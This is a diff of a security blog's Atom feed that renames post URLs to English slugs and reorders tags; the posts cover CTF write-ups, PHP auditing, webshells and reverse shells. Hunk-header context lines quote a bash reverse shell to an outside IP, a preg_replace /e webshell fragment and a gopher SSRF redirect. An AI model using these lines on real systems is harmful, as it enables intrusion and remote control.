@@ -17,8 +17,8 @@
   
   <entry>
     <title>The 2017 Top Programming Languages</title>
-    <link href="https://www.virzz.com/2017/07/24/The%202017%20Top%20Programming%20Languages.html"/>
-    <id>https://www.virzz.com/2017/07/24/The 2017 Top Programming Languages.html</id>
+    <link href="https://www.virzz.com/2017/07/24/the_2017_top_programming_languages.html"/>
+    <id>https://www.virzz.com/2017/07/24/the_2017_top_programming_languages.html</id>
     <published>2017-07-23T17:19:09.000Z</published>
     <updated>2017-07-23T17:26:48.000Z</updated>
     
@@ -45,8 +45,8 @@
   
   <entry>
     <title>中华人民共和国网络安全法</title>
-    <link href="https://www.virzz.com/2017/06/01/%E4%B8%AD%E5%8D%8E%E4%BA%BA%E6%B0%91%E5%85%B1%E5%92%8C%E5%9B%BD%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B3%95.html"/>
-    <id>https://www.virzz.com/2017/06/01/中华人民共和国网络安全法.html</id>
+    <link href="https://www.virzz.com/2017/06/01/Network_security_law_of_the_PRC.html"/>
+    <id>https://www.virzz.com/2017/06/01/Network_security_law_of_the_PRC.html</id>
     <published>2017-06-01T12:24:38.000Z</published>
     <updated>2017-06-01T13:01:21.000Z</updated>
     
@@ -240,8 +240,8 @@
   
   <entry>
     <title>无题之改革开放与一带一路</title>
-    <link href="https://www.virzz.com/2017/05/26/%E6%97%A0%E9%A2%98%E4%B9%8B%E6%94%B9%E9%9D%A9%E5%BC%80%E6%94%BE%E4%B8%8E%E4%B8%80%E5%B8%A6%E4%B8%80%E8%B7%AF.html"/>
-    <id>https://www.virzz.com/2017/05/26/无题之改革开放与一带一路.html</id>
+    <link href="https://www.virzz.com/2017/05/26/reform_opening_and_one_belt_one_road.html"/>
+    <id>https://www.virzz.com/2017/05/26/reform_opening_and_one_belt_one_road.html</id>
     <published>2017-05-26T08:13:54.000Z</published>
     <updated>2017-05-26T08:21:43.000Z</updated>
     
@@ -269,8 +269,8 @@
   
   <entry>
     <title>閱讀筆記《当呼吸化为空气》</title>
-    <link href="https://www.virzz.com/2017/05/21/%E9%96%B1%E8%AE%80%E7%AD%86%E8%A8%98%E3%80%8A%E5%BD%93%E5%91%BC%E5%90%B8%E5%8C%96%E4%B8%BA%E7%A9%BA%E6%B0%94%E3%80%8B.html"/>
-    <id>https://www.virzz.com/2017/05/21/閱讀筆記《当呼吸化为空气》.html</id>
+    <link href="https://www.virzz.com/2017/05/21/reading_notes_for_when_breath_becomes_air.html"/>
+    <id>https://www.virzz.com/2017/05/21/reading_notes_for_when_breath_becomes_air.html</id>
     <published>2017-05-21T15:58:56.000Z</published>
     <updated>2017-05-22T12:42:06.000Z</updated>
     
@@ -338,8 +338,8 @@
   
   <entry>
     <title>PCTF2017-web-ECHO</title>
-    <link href="https://www.virzz.com/2017/04/22/PCTF2017-web-ECHO.html"/>
-    <id>https://www.virzz.com/2017/04/22/PCTF2017-web-ECHO.html</id>
+    <link href="https://www.virzz.com/2017/04/22/pctf_2017_web_echo.html"/>
+    <id>https://www.virzz.com/2017/04/22/pctf_2017_web_echo.html</id>
     <published>2017-04-22T11:24:18.000Z</published>
     <updated>2017-04-24T09:21:41.000Z</updated>
     
@@ -547,16 +547,16 @@ If you see &lt;a href=&quot;http://app.py
     </summary>
     
     
-      <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
-    
       <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
+    
+      <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
     
   </entry>
   
   <entry>
     <title>胖哈勃破處﹣绝对防御</title>
-    <link href="https://www.virzz.com/2017/04/22/%E8%83%96%E5%93%88%E5%8B%83%E7%A0%B4%E8%99%95%EF%B9%A3%E7%BB%9D%E5%AF%B9%E9%98%B2%E5%BE%A1.html"/>
-    <id>https://www.virzz.com/2017/04/22/胖哈勃破處﹣绝对防御.html</id>
+    <link href="https://www.virzz.com/2017/04/22/pwnhub_writeups_absolute_defense.html"/>
+    <id>https://www.virzz.com/2017/04/22/pwnhub_writeups_absolute_defense.html</id>
     <published>2017-04-21T16:55:51.000Z</published>
     <updated>2017-04-21T17:55:55.000Z</updated>
     
@@ -641,8 +641,8 @@ $.get(&quot;/adminshigesha233e3333/flag.php&quot;,
   
   <entry>
     <title>某CTF 2017</title>
-    <link href="https://www.virzz.com/2017/04/16/%E6%9F%90CTF%202017.html"/>
-    <id>https://www.virzz.com/2017/04/16/某CTF 2017.html</id>
+    <link href="https://www.virzz.com/2017/04/16/writeups_for_a_ctf_2017.html"/>
+    <id>https://www.virzz.com/2017/04/16/writeups_for_a_ctf_2017.html</id>
     <published>2017-04-16T12:36:22.000Z</published>
     <updated>2017-04-16T13:27:42.000Z</updated>
     
@@ -786,8 +786,8 @@ echo curl_get($url.&quot;index.php?pwd=$pwd&amp;login=&quot;,&quot;&quot;);
   
   <entry>
     <title>MariaDB for Ubuntu 16.04 TLS</title>
-    <link href="https://www.virzz.com/2017/04/11/MariaDB%20for%20Ubuntu%2016.04%20TLS.html"/>
-    <id>https://www.virzz.com/2017/04/11/MariaDB for Ubuntu 16.04 TLS.html</id>
+    <link href="https://www.virzz.com/2017/04/11/mariadb_for_ubuntu_16.04_tls.html"/>
+    <id>https://www.virzz.com/2017/04/11/mariadb_for_ubuntu_16.04_tls.html</id>
     <published>2017-04-11T14:16:49.000Z</published>
     <updated>2017-04-11T14:20:48.000Z</updated>
     
@@ -831,8 +831,8 @@ flush privileges;</code></pre>
   
   <entry>
     <title>NJCTF 2017 some web writeups</title>
-    <link href="https://www.virzz.com/2017/03/16/NJCTF%202017%20some%20web%20writeups.html"/>
-    <id>https://www.virzz.com/2017/03/16/NJCTF 2017 some web writeups.html</id>
+    <link href="https://www.virzz.com/2017/03/16/some_web_writeups_for_njctf_2017.html"/>
+    <id>https://www.virzz.com/2017/03/16/some_web_writeups_for_njctf_2017.html</id>
     <published>2017-03-15T18:24:32.000Z</published>
     <updated>2017-03-16T11:25:14.000Z</updated>
     
@@ -935,16 +935,16 @@ if (isset($_COOKIE[&amp;quot
     </summary>
     
     
-      <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
-    
       <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
+    
+      <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
     
   </entry>
   
   <entry>
     <title>(新)搭建PHPStorm＋XDebug代碼審計環境</title>
-    <link href="https://www.virzz.com/2017/03/13/(%E6%96%B0)%E6%90%AD%E5%BB%BAPHPStorm%EF%BC%8BXDebug%E4%BB%A3%E7%A2%BC%E5%AF%A9%E8%A8%88%E7%92%B0%E5%A2%83.html"/>
-    <id>https://www.virzz.com/2017/03/13/(新)搭建PHPStorm＋XDebug代碼審計環境.html</id>
+    <link href="https://www.virzz.com/2017/03/13/new_make_env_for_php_code_audit_with_phpstorm_xdebug.html"/>
+    <id>https://www.virzz.com/2017/03/13/new_make_env_for_php_code_audit_with_phpstorm_xdebug.html</id>
     <published>2017-03-13T14:23:44.000Z</published>
     <updated>2017-06-15T16:04:00.000Z</updated>
     
@@ -1048,16 +1048,16 @@ xdebug.remote_host=10.0.1.42
     
       <category term="php" scheme="https://www.virzz.com/tags/php/"/>
     
-      <category term="debug" scheme="https://www.virzz.com/tags/debug/"/>
-    
       <category term="audit" scheme="https://www.virzz.com/tags/audit/"/>
+    
+      <category term="debug" scheme="https://www.virzz.com/tags/debug/"/>
     
   </entry>
   
   <entry>
     <title>App for my OSX</title>
-    <link href="https://www.virzz.com/2017/02/19/App%20for%20my%20OSX.html"/>
-    <id>https://www.virzz.com/2017/02/19/App for my OSX.html</id>
+    <link href="https://www.virzz.com/2017/02/19/app_for_my_mac_osx.html"/>
+    <id>https://www.virzz.com/2017/02/19/app_for_my_mac_osx.html</id>
     <published>2017-02-18T17:05:23.000Z</published>
     <updated>2017-02-18T17:37:01.000Z</updated>
     
@@ -1253,8 +1253,8 @@ xdebug.remote_host=10.0.1.42
   
   <entry>
     <title>Flask-mongoengine 用法小記</title>
-    <link href="https://www.virzz.com/2017/02/06/Flask-mongoengine%20%E7%94%A8%E6%B3%95%E5%B0%8F%E8%A8%98.html"/>
-    <id>https://www.virzz.com/2017/02/06/Flask-mongoengine 用法小記.html</id>
+    <link href="https://www.virzz.com/2017/02/06/flask_mongoengine.html"/>
+    <id>https://www.virzz.com/2017/02/06/flask_mongoengine.html</id>
     <published>2017-02-06T15:39:15.000Z</published>
     <updated>2017-04-27T15:40:01.000Z</updated>
     
@@ -1343,8 +1343,8 @@ from mongoengine.queryset import (DoesNotExist, MultipleObjectsRetur
   
   <entry>
     <title>SSH代理轉socks5</title>
-    <link href="https://www.virzz.com/2016/12/25/SSH%E4%BB%A3%E7%90%86%E8%BD%89socks5.html"/>
-    <id>https://www.virzz.com/2016/12/25/SSH代理轉socks5.html</id>
+    <link href="https://www.virzz.com/2016/12/25/ssh_proxy_to_socks5.html"/>
+    <id>https://www.virzz.com/2016/12/25/ssh_proxy_to_socks5.html</id>
     <published>2016-12-25T07:19:25.000Z</published>
     <updated>2016-12-27T13:00:30.000Z</updated>
     
@@ -1401,8 +1401,8 @@ ssh -qTfnN -D 7070 -p 22 user@host
   
   <entry>
     <title>搭建PHPStorm＋XDebug代碼審計環境</title>
-    <link href="https://www.virzz.com/2016/12/15/%E6%90%AD%E5%BB%BAPHPStorm%EF%BC%8BXDebug%E4%BB%A3%E7%A2%BC%E5%AF%A9%E8%A8%88%E7%92%B0%E5%A2%83.html"/>
-    <id>https://www.virzz.com/2016/12/15/搭建PHPStorm＋XDebug代碼審計環境.html</id>
+    <link href="https://www.virzz.com/2016/12/15/make_a_env_for_php_code_audit_with_phpstorm_and_xdebug.html"/>
+    <id>https://www.virzz.com/2016/12/15/make_a_env_for_php_code_audit_with_phpstorm_and_xdebug.html</id>
     <published>2016-12-15T13:39:25.000Z</published>
     <updated>2017-06-15T16:03:58.000Z</updated>
     
@@ -1519,8 +1519,8 @@ xdebug.profiler_output_dir=/tmp/xdebug
   
   <entry>
     <title>自省之CTF思維</title>
-    <link href="https://www.virzz.com/2016/12/14/%E8%87%AA%E7%9C%81%E4%B9%8BCTF%E6%80%9D%E7%B6%AD.html"/>
-    <id>https://www.virzz.com/2016/12/14/自省之CTF思維.html</id>
+    <link href="https://www.virzz.com/2016/12/14/introspection_by_ctf.html"/>
+    <id>https://www.virzz.com/2016/12/14/introspection_by_ctf.html</id>
     <published>2016-12-14T15:51:58.000Z</published>
     <updated>2016-12-15T09:50:14.000Z</updated>
     
@@ -1594,18 +1594,18 @@ if (strpos($url, 'http://127.0.0.1:8888/')&gt;-1)
     </summary>
     
     
-      <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
-    
       <category term="thinking" scheme="https://www.virzz.com/tags/thinking/"/>
     
       <category term="web" scheme="https://www.virzz.com/tags/web/"/>
+    
+      <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
     
   </entry>
   
   <entry>
     <title>Make ssh client For Mac OS X</title>
-    <link href="https://www.virzz.com/2016/11/28/Make%20ssh%20client%20For%20Mac%20OS%20X.html"/>
-    <id>https://www.virzz.com/2016/11/28/Make ssh client For Mac OS X.html</id>
+    <link href="https://www.virzz.com/2016/11/28/make_ssh_client_for_mac_osx.html"/>
+    <id>https://www.virzz.com/2016/11/28/make_ssh_client_for_mac_osx.html</id>
     <published>2016-11-28T11:14:53.000Z</published>
     <updated>2016-12-11T16:01:37.000Z</updated>
     
@@ -1661,8 +1661,8 @@ ssh-keygen -t
   
   <entry>
     <title>Make and install php 5.6.28 for mac</title>
-    <link href="https://www.virzz.com/2016/11/27/Make%20and%20install%20php%205.6.28%20for%20mac.html"/>
-    <id>https://www.virzz.com/2016/11/27/Make and install php 5.6.28 for mac.html</id>
+    <link href="https://www.virzz.com/2016/11/27/make_and_install_php_5.6.28_for_mac_osx.html"/>
+    <id>https://www.virzz.com/2016/11/27/make_and_install_php_5.6.28_for_mac_osx.html</id>
     <published>2016-11-27T14:12:46.000Z</published>
     <updated>2016-12-15T13:52:10.000Z</updated>
     
@@ -1769,9 +1769,9 @@ brew services start nginx</code></pre>
     </summary>
     
     
-      <category term="php" scheme="https://www.virzz.com/tags/php/"/>
-    
       <category term="mac" scheme="https://www.virzz.com/tags/mac/"/>
+    
+      <category term="php" scheme="https://www.virzz.com/tags/php/"/>
     
       <category term="install" scheme="https://www.virzz.com/tags/install/"/>
     
@@ -1779,8 +1779,8 @@ brew services start nginx</code></pre>
   
   <entry>
     <title>如何折腾我的Flask博客VirzzBlog</title>
-    <link href="https://www.virzz.com/2016/11/15/%E5%A6%82%E4%BD%95%E6%8A%98%E8%85%BE%E6%88%91%E7%9A%84Flask%E5%8D%9A%E5%AE%A2VirzzBlog.html"/>
-    <id>https://www.virzz.com/2016/11/15/如何折腾我的Flask博客VirzzBlog.html</id>
+    <link href="https://www.virzz.com/2016/11/15/how_to_make_my_flask_blog_virzzblog.html"/>
+    <id>https://www.virzz.com/2016/11/15/how_to_make_my_flask_blog_virzzblog.html</id>
     <published>2016-11-15T09:14:08.000Z</published>
     <updated>2016-12-11T16:04:45.000Z</updated>
     
@@ -2121,8 +2121,8 @@ tos = True
   
   <entry>
     <title>PHP安全编码</title>
-    <link href="https://www.virzz.com/2016/11/12/PHP%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81.html"/>
-    <id>https://www.virzz.com/2016/11/12/PHP安全编码.html</id>
+    <link href="https://www.virzz.com/2016/11/12/php_coding_safely.html"/>
+    <id>https://www.virzz.com/2016/11/12/php_coding_safely.html</id>
     <published>2016-11-12T15:40:46.000Z</published>
     <updated>2016-12-12T06:11:52.000Z</updated>
     
@@ -2534,8 +2534,8 @@ echo preg_replace(&quot;/\s*\[p hp language=&quot;&quot;](.+?)\[\/php\]\s*/ies&q
   
   <entry>
     <title>Centos6.8 with Oracle UEK R3 for DTrace and PHP</title>
-    <link href="https://www.virzz.com/2016/10/29/Centos6.8%20with%20Oracle%20UEK%20R3%20for%20DTrace%20and%20PHP.html"/>
-    <id>https://www.virzz.com/2016/10/29/Centos6.8 with Oracle UEK R3 for DTrace and PHP.html</id>
+    <link href="https://www.virzz.com/2016/10/29/centos_6.8_with_oracle_uek_r3_for_dtrace_and_php.html"/>
+    <id>https://www.virzz.com/2016/10/29/centos_6.8_with_oracle_uek_r3_for_dtrace_and_php.html</id>
     <published>2016-10-29T04:31:06.000Z</published>
     <updated>2016-12-12T06:11:36.000Z</updated>
     
@@ -2661,9 +2661,9 @@ wget http://public-yum.oracle.com/public-yum-ol6.repo
     </summary>
     
     
-      <category term="php" scheme="https://www.virzz.com/tags/php/"/>
-    
       <category term="thinking" scheme="https://www.virzz.com/tags/thinking/"/>
+    
+      <category term="php" scheme="https://www.virzz.com/tags/php/"/>
     
       <category term="linux" scheme="https://www.virzz.com/tags/linux/"/>
     
@@ -2671,8 +2671,8 @@ wget http://public-yum.oracle.com/public-yum-ol6.repo
   
   <entry>
     <title>PHP 扩展开发(VS2012)小记</title>
-    <link href="https://www.virzz.com/2016/10/27/PHP%20%E6%89%A9%E5%B1%95%E5%BC%80%E5%8F%91(VS2012)%E5%B0%8F%E8%AE%B0.html"/>
-    <id>https://www.virzz.com/2016/10/27/PHP 扩展开发(VS2012)小记.html</id>
+    <link href="https://www.virzz.com/2016/10/27/development_php_ext_with_vs2012.html"/>
+    <id>https://www.virzz.com/2016/10/27/development_php_ext_with_vs2012.html</id>
     <published>2016-10-26T20:08:20.000Z</published>
     <updated>2016-12-11T16:05:49.000Z</updated>
     
@@ -2925,8 +2925,8 @@ E:\php-x.x.x-src\Zend
   
   <entry>
     <title>那些强悍的PHP一句话后门</title>
-    <link href="https://www.virzz.com/2016/10/19/%E9%82%A3%E4%BA%9B%E5%BC%BA%E6%82%8D%E7%9A%84PHP%E4%B8%80%E5%8F%A5%E8%AF%9D%E5%90%8E%E9%97%A8.html"/>
-    <id>https://www.virzz.com/2016/10/19/那些强悍的PHP一句话后门.html</id>
+    <link href="https://www.virzz.com/2016/10/19/php_webshell.html"/>
+    <id>https://www.virzz.com/2016/10/19/php_webshell.html</id>
     <published>2016-10-19T04:28:37.000Z</published>
     <updated>2016-12-12T06:12:18.000Z</updated>
     
@@ -3093,8 +3093,8 @@ $gzid(&quot;/[discuz]/e&quot;,$_POST['h'],&quot;Access&quot;);
   
   <entry>
     <title>DTracing PHP</title>
-    <link href="https://www.virzz.com/2016/10/17/DTracing%20PHP.html"/>
-    <id>https://www.virzz.com/2016/10/17/DTracing PHP.html</id>
+    <link href="https://www.virzz.com/2016/10/17/dtracing_for_php.html"/>
+    <id>https://www.virzz.com/2016/10/17/dtracing_for_php.html</id>
     <published>2016-10-16T16:45:49.000Z</published>
     <updated>2016-12-12T06:12:30.000Z</updated>
     
@@ -3217,8 +3217,8 @@ Compile Time: 99604
   
   <entry>
     <title>PHP本地文件包含(LFI)漏洞利用</title>
-    <link href="https://www.virzz.com/2016/10/16/PHP%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB(LFI)%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8.html"/>
-    <id>https://www.virzz.com/2016/10/16/PHP本地文件包含(LFI)漏洞利用.html</id>
+    <link href="https://www.virzz.com/2016/10/16/php_local_file_include_lfi.html"/>
+    <id>https://www.virzz.com/2016/10/16/php_local_file_include_lfi.html</id>
     <published>2016-10-16T04:29:29.000Z</published>
     <updated>2016-12-11T16:22:11.000Z</updated>
     
@@ -3307,8 +3307,8 @@ C:\xampp\apache\logs\error.log
   
   <entry>
     <title>Leanote環境搭建小记</title>
-    <link href="https://www.virzz.com/2016/10/16/Leanote%E7%92%B0%E5%A2%83%E6%90%AD%E5%BB%BA%E5%B0%8F%E8%AE%B0.html"/>
-    <id>https://www.virzz.com/2016/10/16/Leanote環境搭建小记.html</id>
+    <link href="https://www.virzz.com/2016/10/16/build_leanote_server.html"/>
+    <id>https://www.virzz.com/2016/10/16/build_leanote_server.html</id>
     <published>2016-10-16T04:29:04.000Z</published>
     <updated>2016-12-11T16:05:14.000Z</updated>
     
@@ -3414,8 +3414,8 @@ tar -C /usr/local -xzf go*.tar.gz
   
   <entry>
     <title>Linux 反弹 shell</title>
-    <link href="https://www.virzz.com/2016/10/16/Linux%20%E5%8F%8D%E5%BC%B9%20shell.html"/>
-    <id>https://www.virzz.com/2016/10/16/Linux 反弹 shell.html</id>
+    <link href="https://www.virzz.com/2016/10/16/linux_shell.html"/>
+    <id>https://www.virzz.com/2016/10/16/linux_shell.html</id>
     <published>2016-10-16T04:28:59.000Z</published>
     <updated>2016-12-12T06:13:35.000Z</updated>
     
@@ -3491,8 +3491,8 @@ bash -i &amp;gt;&amp;amp; /dev/tcp/45.78.13.23/5555 0&amp;gt;&amp;amp;1
   
   <entry>
     <title>Web渗透中的反弹Shell与端口转发的奇淫技巧</title>
-    <link href="https://www.virzz.com/2016/10/16/Web%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BC%B9Shell%E4%B8%8E%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E7%9A%84%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7.html"/>
-    <id>https://www.virzz.com/2016/10/16/Web渗透中的反弹Shell与端口转发的奇淫技巧.html</id>
+    <link href="https://www.virzz.com/2016/10/16/rebound_shell_and_port_forwarding.html"/>
+    <id>https://www.virzz.com/2016/10/16/rebound_shell_and_port_forwarding.html</id>
     <published>2016-10-16T04:28:56.000Z</published>
     <updated>2016-12-12T06:13:40.000Z</updated>
     
@@ -4009,16 +4009,16 @@ curl_close($ch);
     </summary>
     
     
-      <category term="shell" scheme="https://www.virzz.com/tags/shell/"/>
-    
       <category term="web" scheme="https://www.virzz.com/tags/web/"/>
+    
+      <category term="shell" scheme="https://www.virzz.com/tags/shell/"/>
     
   </entry>
   
   <entry>
     <title>&lt;原創&gt;&lt;Freebuf&gt; 論如何在CTF比賽中攪屎</title>
-    <link href="https://www.virzz.com/2016/10/16/%3C%E5%8E%9F%E5%89%B5%3E%3CFreebuf%3E%20%E8%AB%96%E5%A6%82%E4%BD%95%E5%9C%A8CTF%E6%AF%94%E8%B3%BD%E4%B8%AD%E6%94%AA%E5%B1%8E.html"/>
-    <id>https://www.virzz.com/2016/10/16/&lt;原創&gt;&lt;Freebuf&gt; 論如何在CTF比賽中攪屎.html</id>
+    <link href="https://www.virzz.com/2016/10/16/original_freebuf_make_trouble_in_the_ctf.html"/>
+    <id>https://www.virzz.com/2016/10/16/original_freebuf_make_trouble_in_the_ctf.html</id>
     <published>2016-10-16T03:29:03.000Z</published>
     <updated>2016-12-11T15:59:12.000Z</updated>
     
@@ -4269,8 +4269,8 @@ include('index2.php');
   
   <entry>
     <title>三個白帽【￥-1】招聘又开始了，你怕了吗？ Writeup</title>
-    <link href="https://www.virzz.com/2016/09/08/%E4%B8%89%E5%80%8B%E7%99%BD%E5%B8%BD%E3%80%90%EF%BF%A5-1%E3%80%91%E6%8B%9B%E8%81%98%E5%8F%88%E5%BC%80%E5%A7%8B%E4%BA%86%EF%BC%8C%E4%BD%A0%E6%80%95%E4%BA%86%E5%90%97%EF%BC%9F%20Writeup.html"/>
-    <id>https://www.virzz.com/2016/09/08/三個白帽【￥-1】招聘又开始了，你怕了吗？ Writeup.html</id>
+    <link href="https://www.virzz.com/2016/09/08/three_white_hats_are_you_afraid_of_recruitment_again.html"/>
+    <id>https://www.virzz.com/2016/09/08/three_white_hats_are_you_afraid_of_recruitment_again.html</id>
     <published>2016-09-08T04:01:35.000Z</published>
     <updated>2016-12-12T05:16:39.000Z</updated>
     
@@ -4375,16 +4375,16 @@ int geteuid() {
     </summary>
     
     
-      <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
-    
       <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
+    
+      <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
     
   </entry>
   
   <entry>
     <title>三个白帽-寻找来自星星的你-第一期</title>
-    <link href="https://www.virzz.com/2016/06/06/%E4%B8%89%E4%B8%AA%E7%99%BD%E5%B8%BD-%E5%AF%BB%E6%89%BE%E6%9D%A5%E8%87%AA%E6%98%9F%E6%98%9F%E7%9A%84%E4%BD%A0-%E7%AC%AC%E4%B8%80%E6%9C%9F.html"/>
-    <id>https://www.virzz.com/2016/06/06/三个白帽-寻找来自星星的你-第一期.html</id>
+    <link href="https://www.virzz.com/2016/06/06/three_white_hats_find_you_from_star_first.html"/>
+    <id>https://www.virzz.com/2016/06/06/three_white_hats_find_you_from_star_first.html</id>
     <published>2016-06-06T12:56:34.000Z</published>
     <updated>2016-12-12T04:40:33.000Z</updated>
     
@@ -4492,16 +4492,16 @@ file_put_contents(&quot;ssrf.php&quot;, &quot;&lt;?php header('Location: gopher:
     </summary>
     
     
-      <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
-    
       <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
+    
+      <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
     
   </entry>
   
   <entry>
     <title>三個白帽-条条大路通罗马系列2-Writeup</title>
-    <link href="https://www.virzz.com/2016/06/03/%E4%B8%89%E5%80%8B%E7%99%BD%E5%B8%BD-%E6%9D%A1%E6%9D%A1%E5%A4%A7%E8%B7%AF%E9%80%9A%E7%BD%97%E9%A9%AC%E7%B3%BB%E5%88%972-Writeup.html"/>
-    <id>https://www.virzz.com/2016/06/03/三個白帽-条条大路通罗马系列2-Writeup.html</id>
+    <link href="https://www.virzz.com/2016/06/03/three_white_hats_all_roads_lead_to_the_romes_2.html"/>
+    <id>https://www.virzz.com/2016/06/03/three_white_hats_all_roads_lead_to_the_romes_2.html</id>
     <published>2016-06-03T10:12:29.000Z</published>
     <updated>2016-12-12T04:40:54.000Z</updated>
     
@@ -4762,16 +4762,16 @@ if __name__ == '__main__':
     </summary>
     
     
-      <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
-    
       <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
+    
+      <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
     
   </entry>
   
   <entry>
     <title>SCTF2016 痛苦的滲透之路</title>
-    <link href="https://www.virzz.com/2016/05/08/SCTF2016%20%E7%97%9B%E8%8B%A6%E7%9A%84%E6%BB%B2%E9%80%8F%E4%B9%8B%E8%B7%AF.html"/>
-    <id>https://www.virzz.com/2016/05/08/SCTF2016 痛苦的滲透之路.html</id>
+    <link href="https://www.virzz.com/2016/05/08/writeups_for_sctf_2016.html"/>
+    <id>https://www.virzz.com/2016/05/08/writeups_for_sctf_2016.html</id>
     <published>2016-05-08T13:23:12.000Z</published>
     <updated>2016-12-12T04:40:48.000Z</updated>
     
@@ -5030,16 +5030,16 @@ if(($fileext == 'gif')&amp;&amp;($filetype == &quot;image/gif&quot;)){
     </summary>
     
     
-      <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
-    
       <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
+    
+      <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
     
   </entry>
   
   <entry>
     <title>代碼審計-三個白帽-条条大路通罗马系列1</title>
-    <link href="https://www.virzz.com/2016/05/07/%E4%BB%A3%E7%A2%BC%E5%AF%A9%E8%A8%88-%E4%B8%89%E5%80%8B%E7%99%BD%E5%B8%BD-%E6%9D%A1%E6%9D%A1%E5%A4%A7%E8%B7%AF%E9%80%9A%E7%BD%97%E9%A9%AC%E7%B3%BB%E5%88%971.html"/>
-    <id>https://www.virzz.com/2016/05/07/代碼審計-三個白帽-条条大路通罗马系列1.html</id>
+    <link href="https://www.virzz.com/2016/05/07/three_white_hats_all_roads_lead_to_the_romes_1.html"/>
+    <id>https://www.virzz.com/2016/05/07/three_white_hats_all_roads_lead_to_the_romes_1.html</id>
     <published>2016-05-07T10:25:10.000Z</published>
     <updated>2016-12-12T04:40:38.000Z</updated>
     
@@ -5311,16 +5311,16 @@ formname[tmp_name]=任意內容
     </summary>
     
     
-      <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
-    
       <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
+    
+      <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
     
   </entry>
   
   <entry>
     <title>CCTF2016 web小记</title>
-    <link href="https://www.virzz.com/2016/04/24/CCTF2016%20web%E5%B0%8F%E8%AE%B0.html"/>
-    <id>https://www.virzz.com/2016/04/24/CCTF2016 web小记.html</id>
+    <link href="https://www.virzz.com/2016/04/24/web_writeup_for_cctf_2016.html"/>
+    <id>https://www.virzz.com/2016/04/24/web_writeup_for_cctf_2016.html</id>
     <published>2016-04-24T06:51:12.000Z</published>
     <updated>2016-12-12T04:40:20.000Z</updated>
     
@@ -5428,16 +5428,16 @@ Authoritative answers can be found from:
     </summary>
     
     
-      <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
-    
       <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
+    
+      <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
     
   </entry>
   
   <entry>
     <title>三种姿势秒破SYC招聘</title>
-    <link href="https://www.virzz.com/2016/04/13/%E4%B8%89%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%A7%92%E7%A0%B4SYC%E6%8B%9B%E8%81%98.html"/>
-    <id>https://www.virzz.com/2016/04/13/三种姿势秒破SYC招聘.html</id>
+    <link href="https://www.virzz.com/2016/04/13/three_ways_to_break_syc_recruitment.html"/>
+    <id>https://www.virzz.com/2016/04/13/three_ways_to_break_syc_recruitment.html</id>
     <published>2016-04-13T09:03:41.000Z</published>
     <updated>2016-12-12T04:40:27.000Z</updated>
     
@@ -5526,8 +5526,8 @@ if __name__ == '__main__':
   
   <entry>
     <title>0ctf 2016 部分 web writeup</title>
-    <link href="https://www.virzz.com/2016/03/14/0ctf%202016%20%E9%83%A8%E5%88%86%20web%20writeup.html"/>
-    <id>https://www.virzz.com/2016/03/14/0ctf 2016 部分 web writeup.html</id>
+    <link href="https://www.virzz.com/2016/03/14/some_web_writeup_for_0ctf_2016.html"/>
+    <id>https://www.virzz.com/2016/03/14/some_web_writeup_for_0ctf_2016.html</id>
     <published>2016-03-13T22:49:32.000Z</published>
     <updated>2016-12-12T04:39:49.000Z</updated>
     
@@ -5800,16 +5800,16 @@ if __name__ == '__main__':
     </summary>
     
     
-      <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
-    
       <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
+    
+      <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
     
   </entry>
   
   <entry>
     <title>渣渣也去围观ZCTF2016</title>
-    <link href="https://www.virzz.com/2016/01/24/%E6%B8%A3%E6%B8%A3%E4%B9%9F%E5%8E%BB%E5%9B%B4%E8%A7%82ZCTF2016.html"/>
-    <id>https://www.virzz.com/2016/01/24/渣渣也去围观ZCTF2016.html</id>
+    <link href="https://www.virzz.com/2016/01/24/writeups_for_zctf_2016.html"/>
+    <id>https://www.virzz.com/2016/01/24/writeups_for_zctf_2016.html</id>
     <published>2016-01-24T08:49:27.000Z</published>
     <updated>2016-12-12T04:39:42.000Z</updated>
     
@@ -5921,16 +5921,16 @@ fclose($file1);
     </summary>
     
     
-      <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
-    
       <category term="ctf" scheme="https://www.virzz.com/tags/ctf/"/>
+    
+      <category term="writeups" scheme="https://www.virzz.com/tags/writeups/"/>
     
   </entry>
   
   <entry>
     <title>PHPTrace PHP执行流程跟踪工具</title>
